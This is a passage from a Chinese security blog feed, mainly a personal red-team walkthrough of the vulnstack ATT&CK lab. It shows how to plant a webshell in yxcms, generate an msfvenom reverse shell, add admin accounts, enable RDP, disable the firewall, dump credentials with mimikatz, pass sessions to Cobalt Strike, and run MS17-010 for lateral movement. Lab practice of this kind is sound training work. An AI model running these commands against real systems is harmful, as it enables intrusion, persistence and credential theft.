如果有shell出不来可以参考以下链接</p><p>深入理解JAVA反序列化漏洞 | 漏洞盒子 | 互联网安全测试众测平台<br><a href="https://www.vulbox.com/knowledge/detail/?id=11">https://www.vulbox.com/knowledge/detail/?id=11</a></p><p>tomcat不出网回显连续剧第六集 – 先知社区<br><a href="https://xz.aliyun.com/t/7535">https://xz.aliyun.com/t/7535</a></p><p>Weblogic T3/iiop 构造有回显exp方案分析 – 先知社区<br><a href="https://xz.aliyun.com/t/7489">https://xz.aliyun.com/t/7489</a></p><p>weblogic IIOP漏洞的回显构造研究 – 先知社区<br><a href="https://xz.aliyun.com/t/7393">https://xz.aliyun.com/t/7393</a></p><p>linux下java反序列化通杀回显方法的低配版实现 – 先知社区<br><a href="https://xz.aliyun.com/t/7307">https://xz.aliyun.com/t/7307</a></p><p>照弹不误:出站端口受限环境下反弹Shell的思考 – FreeBuf互联网安全新媒体平台<br><a href="https://www.freebuf.com/vuls/232544.html">https://www.freebuf.com/vuls/232544.html</a></p><p>如何绕过高版本JDK限制进行JNDI注入利用<br><a href="https://mp.weixin.qq.com/s/Dq1CPbUDLKH2IN0NA_nBDA">https://mp.weixin.qq.com/s/Dq1CPbUDLKH2IN0NA_nBDA</a></p><p>JosephTribbianni/JNDI: JNDI 注入利用工具<br><a href="https://github.com/JosephTribbianni/JNDI">https://github.com/JosephTribbianni/JNDI</a></p><p>7.永远相信弱口令的力量, 文中没有提到的 mysql, mssql, rdp, ssh, docker-api, 大数据平台相关组件或者更多常见不常见服务, 很多都是弱口令/未授权一把梭的问题<br>最后祝大家 <strong>开局有0day, 处处弱口令</strong></p>]]></content>
    
    
    <categories>
      
      <category>WEB安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>HVV</tag>
      
      <tag>2020攻防演练</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ATT&amp;CK实战系列——红队实战（一）</title>
    <link href="/p/79decd6.html"/>
    <url>/p/79decd6.html</url>
    
    <content type="html"><![CDATA[<div class="note note-success">            <p>关于内网渗透的学习资源太少了，自己也在恶补这块的知识，文章是看前辈们的文章结合自己的实际操作写的，就当作是笔记吧</p>          </div><h2 id="一、环境搭建"><a href="#一、环境搭建" class="headerlink" title="一、环境搭建"></a>一、环境搭建</h2><h3 id="1-1环境搭建测试"><a href="#1-1环境搭建测试" class="headerlink" title="1.1环境搭建测试"></a>1.1环境搭建测试</h3><p>最近想要开始学习内网渗透，搜集了一些教程，准备先实验一个vulnstack靶机，熟悉一下内网渗透操作再学习基础知识。</p><p>靶场下载地址：<a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/2/">http://vulnstack.qiyuanxuetang.net/vuln/detail/2/</a></p><p>压缩包中的win7为VM1，win2003为VM2，win2008为VM3，拓扑图如下所示：</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/01.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><a id="more"></a><p>win7网络适配器1设置成自定义（VMnet1仅主机模式），网络适配器2设置成NAT模式，</p><p>win2003、win2008 网络适配器设置成自定义（VMnet1仅主机模式）。</p><p>主机默认开机密码都是hongrisec@2019，手动在win7的c盘下开启phpstudy。</p><p>设置完毕后VM1、VM2、VM3就在同一内网中了，只有VM1web服务器能够访问内网，所以要想访问win2008和win2003服务器必须要先拿下win7服务器，用它做跳板进内网进行横向渗透。</p><p>攻击机：kali ip: 192.168.66.130 / 物理机 ip: 192.168.1.101 / CS server IP : 192.168.66.129</p><p>win7 内网ip: 192.168.52.143  外网ip: 192.168.66.128</p><p>win2003 ip: 192.168.52.141</p><p>win2008 ip: 192.168.52.138</p><h3 id="1-2信息收集"><a href="#1-2信息收集" class="headerlink" title="1.2信息收集"></a>1.2信息收集</h3><p> nmap扫一下可以看到win7开放了80端口，访问一下得知是是phpstudy搭建，尝试利用phpstudy后门拿shell，利用失败。开启phpstudy时看了下目录，有yxcms，百度下关于yxcms的漏洞，都是需要后台才可以getshell的。这里也可以通过phpmyadmin来getshell。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/02.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><h2 id="二、漏洞利用（两种getshell方式）"><a href="#二、漏洞利用（两种getshell方式）" class="headerlink" title="二、漏洞利用（两种getshell方式）"></a>二、漏洞利用（两种getshell方式）</h2><h3 id="2-1yxcms后台getshell"><a href="#2-1yxcms后台getshell" class="headerlink" title="2.1yxcms后台getshell"></a>2.1yxcms后台getshell</h3><p>打开默认后台 <a href="http://192.168.66.128/yxcms/index.php?r=admin/index/login">http://192.168.66.128/yxcms/index.php?r=admin/index/login</a> 利用burp爆破，admin 123456 登进后台。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/03.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><p>在前台模板-&gt;管理模板文件-&gt;index_index.php处编辑，插入一句话木马</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/04.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><p>shell地址为：<a href="http://192.168.66.128/yxcms/protected/apps/default/view/default/index_index.php">http://192.168.66.128/yxcms/protected/apps/default/view/default/index_index.php</a></p><p>蚁剑连接即可获得shell（蚁剑不用代理）</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/05.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><h3 id="2-2phpmyadmin后台getshell"><a href="#2-2phpmyadmin后台getshell" class="headerlink" title="2.2phpmyadmin后台getshell"></a>2.2phpmyadmin后台getshell</h3><p> 此处过程略过，感兴趣小伙伴可以自己尝试。</p><h2 id="三、内网渗透"><a href="#三、内网渗透" class="headerlink" title="三、内网渗透"></a>三、内网渗透</h2><h3 id="3-1尝试远程登录"><a href="#3-1尝试远程登录" class="headerlink" title="3.1尝试远程登录"></a>3.1尝试远程登录</h3><p> 查看当前用户权限，因为一般拿下window的话都会尝试去连接它的远程桌面，所以再查看一下3389端口开放情况</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/06.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><p>没有回显，即3389并没有开启或者默认端口被改。</p><p>使用<code>tasklist /svc</code>命令查看服务中存在<code>TermService</code>的PID号，未发现该服务，确定3389端口未开启。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/07.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><p>我们使用以下命令开启它（win7、win2003、winxp），运行后显示3389端口已经成功开启（关闭命令把如下0都换成1），当然还有其他开3389的方法，随便用哪种：</p><pre><code class="hljs awk">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="hljs-string">&quot; &quot;</span>Server <span class="hljs-regexp">/v fDenyTSConnections /</span>t REG_DWORD <span class="hljs-regexp">/d 00000000 /</span>f</code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/08.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><p>由于权限较高，直接使用cmd命令 添加用户</p><pre><code class="hljs crmsh">net <span class="hljs-keyword">user</span> <span class="hljs-title">ice</span> Aa123456 /add <span class="hljs-comment"># 添加账户密码</span>net localgroup administrators ice /add <span class="hljs-comment"># 给ice账户添加为管理员权限</span>net <span class="hljs-keyword">user</span> <span class="hljs-title">ice</span> <span class="hljs-comment"># 查询是否成功添加ice用户</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/09.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><p>使用账号：ice，密码：Aa123456 登录远程桌面。但是登陆失败，nmap扫描3389端口发现状态为filtered。查看win7，防火墙开启了阻止所有与未在允许程序列表中的程序的连接，换句话说，设置了白名单，只能本地连接。</p><p>由于这里权限较高，我们可以直接在shell中使用<code>netsh advfirewall set allprofiles state off</code>命令关闭防火墙</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/10.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><p>关闭防火墙后利用远程桌面连接服务器即可</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/11.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><h3 id="3-2msf反弹shell"><a href="#3-2msf反弹shell" class="headerlink" title="3.2msf反弹shell"></a>3.2msf反弹shell</h3><p>使用msf反弹一个shell。msf生成shell.exe，用蚁剑上传至win7，再在msf设置监听，在蚁剑上执行shell.exe，可以看到msf成功获得一个meterpreter</p><pre><code class="hljs routeros">15:57 root@iceH:~ <span class="hljs-variable">$msfvenom</span> -p windows/meterpreter/reverse_tcp <span class="hljs-attribute">LHOST</span>=192.168.66.130 <span class="hljs-attribute">LPORT</span>=4444 -f exe &gt; shell.exe<span class="hljs-literal">No</span> platform was selected, choosing Msf::Module::Platform::Windows <span class="hljs-keyword">from</span> the payload<span class="hljs-literal">No</span> Arch selected, selecting Arch: x86 <span class="hljs-keyword">from</span> the payload<span class="hljs-literal">No</span> encoder <span class="hljs-keyword">or</span> badchars specified, outputting<span class="hljs-built_in"> raw </span>payloadPayload size: 341 bytesFinal size of exe file: 73802 bytes</code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/12.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><h3 id="3-3mimikatz获取账号密码"><a href="#3-3mimikatz获取账号密码" class="headerlink" title="3.3mimikatz获取账号密码"></a>3.3mimikatz获取账号密码</h3><p>加载mimikatz模块，加载模块前需要先将meterpreter迁移到64位的进程，而且该进程也需要是system权限运行的</p><pre><code class="hljs arduino">migrate PIDload mimikatzmimikatz_command -f sekurlsa::searchPasswords</code></pre><p>ps命令查看进程ID，一般选择explorer.exe对应的PID，但是这里它不是system权限，选择注入其他合法进程。</p><p>这一步中我没有成功读出密码 。</p><h3 id="3-4派生CobaltStrike权限"><a href="#3-4派生CobaltStrike权限" class="headerlink" title="3.4派生CobaltStrike权限"></a>3.4派生CobaltStrike权限</h3><p>先在CS上设置监听</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/13.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><p> 拥有msf shell的攻击机与搭建cobaltstrike的服务端不需要是同一台主机，端口相通即可实现远程派生shell</p><pre><code class="hljs sql"><span class="hljs-keyword">use</span> exploit/windows/<span class="hljs-keyword">local</span>/payload_inject<span class="hljs-keyword">set</span> payload windows/meterpreter/reverse_http<span class="hljs-keyword">set</span> DisablePayloadHandler <span class="hljs-literal">true</span>   <span class="hljs-comment">#默认情况下，payload_inject执行之后会在本地产生一个新的handler，由于已经有了一个不需要再产生一个，所以这里设置为true</span><span class="hljs-keyword">set</span> lhost xxxx                   <span class="hljs-comment">#cobaltstrike监听的ip</span><span class="hljs-keyword">set</span> lport <span class="hljs-number">14444</span>                  <span class="hljs-comment">#cobaltstrike监听的端口 </span><span class="hljs-keyword">set</span> <span class="hljs-keyword">session</span> <span class="hljs-number">1</span>                    <span class="hljs-comment">#这里是当前获得的session的id</span>exploit</code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/14.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><p>可以看到cs成功接收到shell</p><h3 id="3-5域信息收集"><a href="#3-5域信息收集" class="headerlink" title="3.5域信息收集"></a>3.5域信息收集</h3><p>渗透测试的本质是信息收集，先记录一些常用命令</p><pre><code class="hljs jboss-cli">net time <span class="hljs-string">/domain</span>        <span class="hljs-comment">#查看时间服务器，判断主域，主域服务器都做时间服务器</span>net user <span class="hljs-string">/domain</span>        <span class="hljs-comment">#查看域用户</span>net view <span class="hljs-string">/domain</span>        <span class="hljs-comment">#查看有几个域</span>ipconfig <span class="hljs-string">/all</span> 　　　　　  <span class="hljs-comment">#查询本机IP段，所在域等 </span>net config Workstation  <span class="hljs-comment">#当前计算机名，全名，用户名，系统版本，工作站域，登陆域 </span>net user 　　　　　　　   <span class="hljs-comment">#本机用户列表</span>net group <span class="hljs-string">&quot;domain computers&quot;</span> <span class="hljs-string">/domain</span>   <span class="hljs-comment">#查看域内所有的主机名 </span>net group <span class="hljs-string">&quot;domain admins&quot;</span> <span class="hljs-string">/domain</span>      <span class="hljs-comment">#查看域管理员 </span>net group <span class="hljs-string">&quot;domain controllers&quot;</span> <span class="hljs-string">/domain</span> <span class="hljs-comment">#查看域控</span>net localhroup administrators          <span class="hljs-comment">#本机管理员[通常含有域用户]</span>net user 用户名 <span class="hljs-string">/domain</span>                 <span class="hljs-comment">#获取指定用户的账户信息  </span>net group <span class="hljs-string">/domain</span>                      <span class="hljs-comment">#查询域里面的工作组 </span>net group 组名 <span class="hljs-string">/domain</span>                  <span class="hljs-comment">#查询域中的某工作组</span></code></pre><p>ipconfig /all看到有内网ip，有域</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/15.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><p>查询域列表</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/16.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><p>查询同域机器</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/17.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><p>判断主域</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/18.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><p>查询域用户</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/19.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><p>显示当前域中的计算机列表</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/20.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><p>整理一下信息</p><p>域：god.org</p><p>域内有三个用户：Administrator、ligang、liukaifeng01</p><p>域内三台主机：ROOT-TVI862UBEH(192.168.52.141)、STU1(win7)、OWA</p><p>域控：OWA(192.168.52.138)</p><p> win7内网ip：192.168.52.143</p><h2 id="四、横向移动"><a href="#四、横向移动" class="headerlink" title="四、横向移动"></a>四、横向移动</h2><h3 id="4-1添加路由、挂Socks4a代理"><a href="#4-1添加路由、挂Socks4a代理" class="headerlink" title="4.1添加路由、挂Socks4a代理"></a>4.1添加路由、挂Socks4a代理</h3><p>添加路由的目的是为了让MSF其他模块能访问内网的其他主机，即52网段的攻击流量都通过已渗透的这台目标主机的meterpreter会话来传递</p><p>添加socks4a代理的目的是为了让其他软件更方便的访问到内网的其他主机的服务</p><p>（添加路由一定要在挂代理之前，因为代理需要用到路由功能）</p><p> 添加内网路由</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/21.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><p>arp -a查看一下所有接口的当前 ARP 缓存表</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/22.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><p>设置代理，设置成功后打开其他程序需前加上proxychains</p><pre><code class="hljs sql">msf exploit(multi/<span class="hljs-keyword">handler</span>) &gt; <span class="hljs-keyword">use</span> auxiliary/<span class="hljs-keyword">server</span>/socks4amsf auxiliary(<span class="hljs-keyword">server</span>/socks4a) &gt; <span class="hljs-keyword">show</span> options<span class="hljs-keyword">Module</span> options (auxiliary/<span class="hljs-keyword">server</span>/socks4a):   <span class="hljs-keyword">Name</span>     <span class="hljs-keyword">Current</span> Setting  <span class="hljs-keyword">Required</span>  Description   <span class="hljs-comment">----     ---------------  --------  -----------</span>   SRVHOST  <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>          yes       The address <span class="hljs-keyword">to</span> listen <span class="hljs-keyword">on</span>   SRVPORT  <span class="hljs-number">1080</span>             yes       The port <span class="hljs-keyword">to</span> listen on.Auxiliary <span class="hljs-keyword">action</span>:   <span class="hljs-keyword">Name</span>   Description   <span class="hljs-comment">----   -----------</span>   Proxy  msf auxiliary(<span class="hljs-keyword">server</span>/socks4a) &gt; run[*] Auxiliary <span class="hljs-keyword">module</span> running <span class="hljs-keyword">as</span> background job <span class="hljs-number">0.</span>[*] <span class="hljs-keyword">Starting</span> the socks4a proxy <span class="hljs-keyword">server</span></code></pre><p>然后打开/etc/proxychains.conf（原始端口是9050，改为我们设置的1080）</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/23.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><p>测试一下可以成功访问192.168.52.0网段</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/24.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><h3 id="4-2拿下第二台主机"><a href="#4-2拿下第二台主机" class="headerlink" title="4.2拿下第二台主机"></a>4.2拿下第二台主机</h3><p>扫描一下VM2（192.168.52.141）proxychains nmap -p 1-1000 -Pn -sT 192.168.52.141</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/25.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><p>开放了445端口，所以利用<code> use auxiliary/scanner/smb/smb_version</code> 可以扫描系统版本，扫描结果是<code>win2003</code></p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/26.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><p>使用<code>ms08-067</code>打一下，发现打不了</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/27.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><p>开始尝试<code>ms17-010</code>，使用<code>auxiliary/scanner/smb/smb_ms17_010</code>对52这个段进行扫描，发现三台主机都存在漏洞</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/28.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><p>利用<code>exploit/windows/smb/ms17_010_psexec</code>对<code>192.168.52.141</code>进行攻击，发现没办法弹回shell。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/29.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><p>发现可以使用<code>auxiliary/admin/smb/ms17_010_command</code>来执行一些命令且是系统权限。</p><pre><code class="hljs shell">use auxiliary/admin/smb/ms17_010_commandshow optionsset rhosts 192.168.52.141set command &quot;net user ice Aa123456 /add&quot; #添加用户exploit #成功执行</code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/30.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><pre><code class="hljs shell">set command &quot;net localgroup administrators ice /add&quot; #管理员权限exploit #成功执行</code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/31.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><pre><code class="hljs shell">set command &#x27;REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f&#x27;exploit #成功执行</code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/32.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><p>然后使用<code>proxychains</code>连接他的3389，<code>proxychains rdesktop 192.168.52.141</code></p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/33.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><h3 id="4-3拿下域控"><a href="#4-3拿下域控" class="headerlink" title="4.3拿下域控"></a>4.3拿下域控</h3><p>pass</p>]]></content>
    
    
    <categories>
      
      <category>红队攻防</category>
      
    </categories>
    
    
    <tags>
      
      <tag>红队实战</tag>
      
      <tag>内网渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
